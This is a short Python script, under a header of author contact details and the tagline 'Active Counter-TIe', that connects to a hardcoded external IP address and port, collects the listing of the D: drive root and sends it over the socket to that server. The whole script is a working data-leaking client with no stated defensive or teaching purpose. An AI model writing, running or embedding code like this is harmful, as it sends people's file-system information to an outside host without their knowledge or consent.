#  ■ Copyright (c) 2024 | Axis9 (umbrella corp. division)
#  ■ kilitary@gmail.com  | deconf@ya.ru | https://twitter.com/CommandmentTwo  | https://vk.com/agent1348
#  ■ bus: https://linktr.ee/kilitary
#  ■ mode: Active Counter-TIe

#  Copyright> YEAR:2022 WHO:Sergey Efimov EMAIL:kilitary@gmail.com WHERE:RUSSIA WHY:L
import os
import sys
import socket
import glob
import time
from pprint import pprint

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = ('91.199.147.41', 54000)
print('connecting to %s port %s' % server_address)
sock.connect(server_address)

try:

    # Send data
    message = glob.glob("d:\\*")
    pprint(message)
    print('sending "%s"' % message)
    nsend = sock.sendall(", ".join(message).encode())
    print(f'sent {nsend} bytes')

    # Look for the response
    amount_received = 0
    amount_expected = 0  # len(message)

    while amount_received < amount_expected:
        data = sock.recv(16)
        amount_received += len(data)
        print('received "%s"' % data)

finally:
    print('closing socket')
    sock.close()

    time.sleep(240)
